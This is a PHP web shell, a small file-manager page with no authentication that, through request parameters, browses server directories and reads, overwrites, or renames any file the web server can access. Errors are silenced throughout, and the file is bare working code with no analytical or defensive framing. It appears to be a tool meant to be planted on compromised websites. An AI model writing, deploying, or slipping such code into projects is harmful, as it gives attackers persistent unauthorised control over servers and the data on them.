<style type="text/css">
	body {
		font-family: Arial;
		color:#000;
	} a {
		color:#000;
		text-decoration:none;
	} table, tr, td {
		border:1px solid #000;
		border-spacing:0;
		border-collapse: collapse;
	}
</style>
<?php
error_reporting(0);
define('SEP', '/');
function cwd() {
	$cwd = @str_replace('\\', '/', @getcwd());
	return $cwd;
}
function pwd() {
    $dir = explode("/", @cwd());
    foreach($dir as $key => $index) {
        print "<a href='?dir=";
        for($i = 0; $i <= $key; $i++) {
            print $dir[$i];
            if($i != $key) {
            print "/";
            }
        }
        print "'>".$index."</a>/";
    }
}
@pwd();
if ($_POST['do'] == 'edit') {
	if (isset($_POST['text'])) {
		$fp = @fopen($_POST['file'], 'w');
		if (@fwrite($fp, $_POST['text'])) {
			$nb = "Success";
		} else {
			$nb = "Failed";
		}
	} $text = @htmlspecialchars(@file_get_contents($_POST['file']));
	?>
	<form method="post">
		<textarea name="text"><?php print $text ?></textarea>
		<input type="hidden" name="do" value="edit">
		<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
		<input type="submit">
	</form>
	<?php
}
if ($_POST['do'] == 'rename') {
	if (isset($_POST['rename'])) {
		if (@rename($_POST['file'], $_POST['rename'])) {
			$nb = "Success";
		} else {
			$nb = "Failed";
		}
	}
	?>
	<form method="post">
		<input type="text" name="rename" value="<?php print $_POST['file'] ?>">
		<input type="hidden" name="do" value="rename">
		<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
	</form>
	<?php
}
if (isset($_GET['dir'])) {
	@chdir($_GET['dir']);
}
?>
<table>
	<tr>
		<th>Filename</th>
		<th>Action</th>
	</tr>
<?php 
$scdir = @scandir(@cwd());
foreach ($scdir as $dir) {
	if (!is_dir($dir)) continue;
	if ($dir === '.' || $dir === '..') continue;
	?>
	<tr>
		<td>
			<a href="?dir=<?php print @cwd().SEP.$dir ?>"><?php print $dir ?></a>
		</td>
		<td>
			<center>
				<form method="post" accept="?dir=<?php print @cwd() ?>">
					<select name="do">
						<option value="rename">Rename</option>
					</select>
					<input type="hidden" name="file" value="<?php print @cwd().SEP.$dir ?>">
					<input type="submit">
				</form>
			</center>
		</td>
	</tr>
	<?php
}
foreach ($scdir as $file) {
	if (!is_file($file)) continue;
	?>
	<tr>
		<td>
			<a href=""><?php print $file ?></a>
		</td>
		<td>
			<center>
				<form method="post" accept="?dir=<?php print @cwd() ?>">
					<select name="do">
						<option value="edit">Edit</option>
						<option value="rename">Rename</option>
					</select>
					<input type="hidden" name="file" value="<?php print @cwd().SEP.$file ?>">
					<input type="submit">
				</form>
			</center>
		</td>
	</tr>
	<?php
}
 ?>
</table>
